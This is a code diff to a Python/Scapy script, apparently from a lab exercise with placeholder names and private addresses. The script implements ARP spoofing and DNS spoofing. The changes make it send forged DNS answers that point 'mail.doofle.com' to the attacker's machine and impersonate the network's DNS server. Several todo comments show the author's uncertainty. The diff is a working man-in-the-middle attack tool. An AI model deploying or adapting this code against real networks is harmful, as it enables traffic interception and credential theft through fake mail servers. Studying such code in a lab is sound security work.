@@ -10,13 +10,13 @@ SECRATERY_IP = "10.0.2.15"  # Enter the attacker's IP.  # todo: should be 127.0.
 NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
-IFACE = "enp0s3"  # Enter the network interface you work on. # todo: how to find it?
+IFACE = "enp0s3"  # Enter the network interface you work on.
 
 FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
-    b"mail.doofle.com": FAKE_GMAIL_IP
+    "mail.doofle.com": FAKE_GMAIL_IP  # todo: why do we need the dot in the end?
 }
 
 
@@ -42,6 +42,7 @@ class ArpSpoofer(object):
         self.spoof_ip = spoof_ip
         self.target_mac = None
         self.spoof_count = 0
+        self.target_mac = self.get_target_mac()
 
     def get_target_mac(self) -> str:
         # TODO: catch the error & handle uninitialized
@@ -67,7 +68,7 @@ class ArpSpoofer(object):
                            hwdst=self.target_mac,
                            psrc=self.spoof_ip)
 
-        scapy.send(packet, verbose=False)
+        scapy.send(packet, verbose=False, iface=IFACE)
         self.spoof_count += 1
 
     def run(self) -> None:
@@ -125,10 +126,13 @@ class DnsHandler(object):
             IP(dst=self.real_dns_server_ip) /
             UDP(sport=pkt[UDP].sport) /
             DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
-            verbose=0,
+            verbose=0
         )
-        resp_pkt = IP(dst=pkt[IP].src, src=SECRATERY_IP) / UDP(dport=pkt[UDP].sport) / DNS()
+        # todo: check if src supposed to be NETWORK_DNS_SERVER_IP
+        resp_pkt = IP(dst=pkt[IP].src, src=NETWORK_DNS_SERVER_IP) / UDP(dport=pkt[UDP].sport, sport=53) / DNS()
         resp_pkt[DNS] = response[DNS]
+        scapy.send(resp_pkt, verbose=0)
+        print(f"Responding to {pkt[IP].src}")
         return resp_pkt
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
@@ -140,14 +144,15 @@ class DnsHandler(object):
         @param to ip address to return from the DNS lookup.
         @return fake DNS response to the request.
         """
-        # todo: what to write instead of 53?
-        # spf_resp = IP(dst=pkt[IP].src) / \
-        #            UDP(dport=pkt[UDP].sport, sport=53) / \
-        #            DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=to) /
-        #                                              DNSRR(rrname=pkt[DNSRR].rrname, rdata=to))
-        spf_resp = IP(dst=pkt[IP].src, src=SECRATERY_IP) / UDP(dport=pkt[UDP].sport) / \
-                   DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=to) /
-                   DNSRR(rrname=pkt[DNSRR].rrname, rdata=to))
+        spf_resp = IP(dst=pkt[IP].src, src=self.real_dns_server_ip) / UDP(dport=pkt[UDP].sport, sport=53) / DNS(id=pkt[DNS].id,
+                                                                                   qd=pkt[DNS].qd,
+                                                                                   ancount=1,
+                                                                                   an=DNSRR(rrname=pkt[DNS].qd.qname,
+                                                                                            type='A',
+                                                                                            ttl=1000,
+                                                                                            rdata=to))
+        scapy.send(spf_resp, verbose=0, iface=IFACE)
+        print(f"Spoofed DNS Response Sent: {pkt[IP].src}")
         return spf_resp  # todo: what is it: , verbose=0, iface=IFACE)
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
@@ -162,15 +167,15 @@ class DnsHandler(object):
         """
         chosen = None
         if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:  # todo: check what doet it mean
-            host_name = pkt["DNS Question Record"].qname
-            pkt = None
+            host_name = pkt["DNS Question Record"].qname.decode()[:-1]
+            print("host name=", host_name)
+            print("is it in dist? ", host_name in self.spoof_dict)
             if host_name in self.spoof_dict:
-                pkt = self.get_spoofed_dns_response(pkt, self.spoof_dict[host_name])
+                self.get_spoofed_dns_response(pkt, self.spoof_dict[host_name])
                 chosen = "Spoofed"
             else:
-                pkt = self.get_real_dns_response(pkt)
+                received_pkt = self.get_real_dns_response(pkt)
                 chosen = "Real"
-            scapy.send(pkt, verbose=0, iface=IFACE)
         print("resolve_packet output", chosen)
         return chosen
 
